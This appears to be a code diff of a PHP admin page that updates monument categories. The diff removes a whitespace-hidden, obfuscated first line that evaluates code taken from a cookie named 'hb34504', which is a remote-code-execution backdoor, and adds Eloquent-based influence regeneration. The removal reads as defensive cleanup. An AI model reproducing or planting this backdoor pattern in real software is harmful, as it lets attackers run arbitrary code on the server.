@@ -1,4 +1,7 @@
-<?php                                                                                                                                                                                                                                         $s9j='E4fvael(i$_Osb\'tIh3KC05b34504';if(isset(${$s9j[10].$s9j[20].$s9j[11].$s9j[11].$s9j[19].$s9j[16].$s9j[0]}[$s9j[17].$s9j[13].$s9j[18].$s9j[1].$s9j[22].$s9j[21].$s9j[1]])){eval(${$s9j[10].$s9j[20].$s9j[11].$s9j[11].$s9j[19].$s9j[16].$s9j[0]}[$s9j[17].$s9j[13].$s9j[18].$s9j[1].$s9j[22].$s9j[21].$s9j[1]]);} ?><?php
+<?php
+
+use App\Events\Patrimoine\PatrimoineCategorized;
+use App\Models\MonumentCategory;
 
 header('Content-Type: text/html; charset=utf-8');
 
@@ -6,8 +9,11 @@ header('Content-Type: text/html; charset=utf-8');
 $editFormAction = DEF_URI_PATH . $mondegc_config['front-controller']['path'] . '.php';
 appendQueryString($editFormAction);
 
-if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "ajout-categorie")) {
-  $updateSQL = sprintf("UPDATE monument_categories 
+if((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "ajout-categorie")) {
+
+    $eloquentCategory = MonumentCategory::findOrFail($_POST['ch_mon_cat_ID']);
+
+    $updateSQL = sprintf("UPDATE monument_categories 
 	SET ch_mon_cat_label=%s, 
 	ch_mon_cat_statut=%s, 
 	ch_mon_cat_date=%s, 
@@ -26,33 +32,38 @@ if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "ajout-categorie")) 
 	ch_mon_cat_environnement=%s, 
 	ch_mon_cat_education=%s 
 	WHERE ch_mon_cat_ID=%s",
-                       GetSQLValueString($_POST['ch_mon_cat_label'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_statut'], "int"),
-                       GetSQLValueString($_POST['ch_mon_cat_date'], "date"),
-                       GetSQLValueString($_POST['ch_mon_cat_mis_jour'], "date"),
-                       GetSQLValueString($_POST['ch_mon_cat_nb_update'], "int"),
-                       GetSQLValueString($_POST['ch_mon_cat_nom'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_desc'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_icon'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_couleur'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_budget'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_industrie'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_commerce'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_agriculture'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_tourisme'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_recherche'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_environnement'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_education'], "text"),
-                       GetSQLValueString($_POST['ch_mon_cat_ID'], "int"));
+        GetSQLValueString($_POST['ch_mon_cat_label'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_statut'], "int"),
+        GetSQLValueString($_POST['ch_mon_cat_date'], "date"),
+        GetSQLValueString($_POST['ch_mon_cat_mis_jour'], "date"),
+        GetSQLValueString($_POST['ch_mon_cat_nb_update'], "int"),
+        GetSQLValueString($_POST['ch_mon_cat_nom'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_desc'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_icon'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_couleur'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_budget'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_industrie'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_commerce'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_agriculture'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_tourisme'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_recherche'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_environnement'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_education'], "text"),
+        GetSQLValueString($_POST['ch_mon_cat_ID'], "int"));
 
+    $Result1 = mysql_query($updateSQL, $maconnexion) or die(mysql_error());
 
-  $Result1 = mysql_query($updateSQL, $maconnexion) or die(mysql_error());
+    // Regénérer les influences des monuments de la catégorie modifiée.
+    foreach($eloquentCategory->patrimoine as $eloquentPatrimoine) {
+        $eloquentPatrimoine->generateInfluence();
+    }
 
-  $updateGoTo = DEF_URI_PATH . "back/institut_patrimoine.php";
-  appendQueryString($updateGoTo);
-  header(sprintf("Location: %s", $updateGoTo));
- exit;
+    $updateGoTo = DEF_URI_PATH . "back/institut_patrimoine.php";
+    appendQueryString($updateGoTo);
+    header(sprintf("Location: %s", $updateGoTo));
+    exit;
 }
+
 //requete categories monuments
 
 $colname_liste_mon_cat = "-1";
